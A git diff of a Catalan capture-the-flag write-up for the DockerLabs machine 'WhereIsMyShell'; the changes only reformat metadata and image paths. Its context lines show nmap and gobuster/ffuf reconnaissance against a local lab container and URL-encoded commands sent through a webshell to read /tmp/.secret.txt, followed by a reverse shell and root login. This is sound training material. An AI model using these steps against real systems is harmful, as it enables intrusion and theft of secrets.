@@ -1,12 +1,6 @@
 # WhereIsMyShell
 
-Plataforma: Dockerlabs
-OS: Linux
-Level: Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 5 de diciembre de 2024 21:28
+Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:28
 
 ## Reconeixement
 
@@ -16,7 +10,7 @@ Created time: 5 de diciembre de 2024 21:28
 sudo nmap -p- -sS --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
 ```
 
-![image.png](/images/DockerLabs/image.png)
+![image.png](../../.gitbook/assets/image.png)
 
 ### FUZZING
 
@@ -24,11 +18,11 @@ sudo nmap -p- -sS --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
 ```
 
-![image.png](/images/DockerLabs/image%201.png)
+![image.png](<../../.gitbook/assets/image 1.png>)
 
 /Warning.htm
 
-![image.png](/images/DockerLabs/image%202.png)
+![image.png](<../../.gitbook/assets/image 2.png>)
 
 Fem fuzzing per trobar el parametre per executar la web shell:
 
@@ -38,9 +32,9 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "[
 
 resultat: parameter
 
-executem webshell per veure que hi ha al  /tmp
+executem webshell per veure que hi ha al /tmp
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](<../../.gitbook/assets/image 3.png>)
 
 Encodejem la url:
 
@@ -50,7 +44,7 @@ ls -la /tmp : ls%20-la%20%2Ftmp
 cat /tmp/.secret.txt = cat%20%2Ftmp%2F.secret.txt
 ```
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](<../../.gitbook/assets/image 4.png>)
 
 Obtenim una rever shell:
 
@@ -69,4 +63,4 @@ Tractament tty
 
 Utilitzem la contrasenya que hem trobat de root:
 
-![image.png](/images/DockerLabs/image%205.png)
+![image.png](<../../.gitbook/assets/image 5.png>)
